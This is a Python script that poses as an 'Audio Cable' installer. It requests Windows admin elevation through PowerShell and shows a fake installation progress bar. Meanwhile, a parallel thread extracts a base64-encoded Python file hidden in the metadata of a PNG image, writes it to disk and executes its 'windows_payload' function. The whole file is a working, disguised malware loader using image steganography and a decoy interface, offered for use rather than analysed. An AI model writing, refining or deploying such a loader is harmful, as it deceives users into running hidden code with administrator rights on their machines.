import os
import sys
import subprocess
import ctypes
import tkinter as tk
from tkinter import messagebox, ttk
from PIL import Image
import importlib.util
import base64
import threading

def log_checkpoint(message):
    """ Log checkpoints for debugging purposes """
    print(f"[DEBUG] {message}")

def is_admin():
    """ Check if the script is running with admin privileges """
    log_checkpoint("Checking for admin privileges...")
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except AttributeError:
        log_checkpoint("AttributeError occurred while checking admin privileges.")
        return False

def run_as_admin():
    """ Attempt to relaunch the script with admin privileges """
    log_checkpoint("Attempting to run script as admin...")
    if sys.platform == "win32":
        try:
            if not is_admin():
                log_checkpoint("Not running as admin, attempting to elevate privileges...")
                script = os.path.abspath(__file__)
                params = ' '.join([script] + sys.argv[1:])
                subprocess.run(['powershell', '-Command', f'Start-Process python -ArgumentList "{params}" -Verb runAs'], check=True)
                log_checkpoint("Script elevated to admin successfully.")
                return True  # Elevated privileges obtained
            else:
                log_checkpoint("Already running as admin.")
                return True  # Already running with elevated privileges
        except subprocess.CalledProcessError as e:
            log_checkpoint(f"Failed to elevate privileges: {e}")
            messagebox.showerror("Admin Privileges Required", f"Failed to elevate privileges: {e}")
            return False  # Failed to obtain elevated privileges
    return False  # Not on Windows platform

def simulate_installation():
    """ Simulate the installation process with a progress bar """
    log_checkpoint("Simulating installation process...")
    window = tk.Tk()
    window.title("Installing Audio Cable")
    window.geometry("300x200")
    progress = tk.IntVar()

    def start_progress():
        log_checkpoint("Installation process started...")
        for i in range(101):
            progress.set(i)
            window.update_idletasks()
            window.after(50)  # Simulate delay
            window.after(85)
            window.after(99)
        log_checkpoint("Installation process completed.")
        window.destroy()
    
    def close_progress():
        window.destroy()

    label = tk.Label(window, text="Installing Audio Cable...")
    label.pack(pady=10)
    progressbar = ttk.Progressbar(window, variable=progress, maximum=100)
    progressbar.pack(pady=10, padx=10, fill=tk.X)
    start_button = tk.Button(window, text="Start", command=start_progress)
    start_button.pack(pady=10)
    cancel_button = tk.Button(window, text="Cancel", command=close_progress)
    cancel_button.pack(pady=10)
    window.mainloop()

def run_payload():
    """ Execute the provided payload """
    log_checkpoint("Running payload...")
    img_path = "./tainted.png"
    output_payload_path = "./extracted_payload.py"

    def extract_data_from_image(image_path):
        log_checkpoint(f"Attempting to extract data from image: {image_path}")
        try:
            image = Image.open(image_path)
            metadata = image.info
            log_checkpoint(f"Image metadata: {metadata}")
            encoded_string = metadata.get('python_file')
            log_checkpoint(f"Encoded string found: {bool(encoded_string)}")
            return encoded_string
        except Exception as e:
            log_checkpoint(f"Error reading image metadata: {e}")
            return None

    def decode_base64_to_file(encoded_string, output_file_path):
        log_checkpoint("Attempting to decode base64 string to file...")
        try:
            decoded_bytes = base64.b64decode(encoded_string)
            with open(output_file_path, 'wb') as file:
                file.write(decoded_bytes)
            log_checkpoint(f"File successfully written to: {output_file_path}")
        except Exception as e:
            log_checkpoint(f"Error decoding base64 string: {e}")
            raise

    extracted_encoded_string = extract_data_from_image(img_path)
    if extracted_encoded_string:
        try:
            decode_base64_to_file(extracted_encoded_string, output_payload_path)
            print("Python file extracted successfully!")
        except Exception:
            log_checkpoint("Failed to decode and save the Python file.")
            return
    else:
        log_checkpoint("No embedded Python file found in the image.")
        return

    try:
        log_checkpoint(f"Attempting to execute the extracted payload: {output_payload_path}")
        spec = importlib.util.spec_from_file_location("extracted_payload", output_payload_path)
        extracted_module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(extracted_module)

        if hasattr(extracted_module, "windows_payload"):
            log_checkpoint("Found `windows_payload` function. Executing...")
            extracted_module.windows_payload()
            print("Successfully executed `windows_payload` from the extracted payload.")
        else:
            log_checkpoint("No `windows_payload` function found in the extracted payload.")
    except Exception as e:
        log_checkpoint(f"Error occurred while importing or executing the payload: {e}")

if __name__ == "__main__":
    if run_as_admin():  # Only proceed if elevated privileges are obtained
        # Start both the installation simulation and the payload execution in parallel
        installation_thread = threading.Thread(target=simulate_installation)
        payload_thread = threading.Thread(target=run_payload)

        installation_thread.start()
        payload_thread.start()

        installation_thread.join()
        payload_thread.join()

        log_checkpoint("Script finished.")
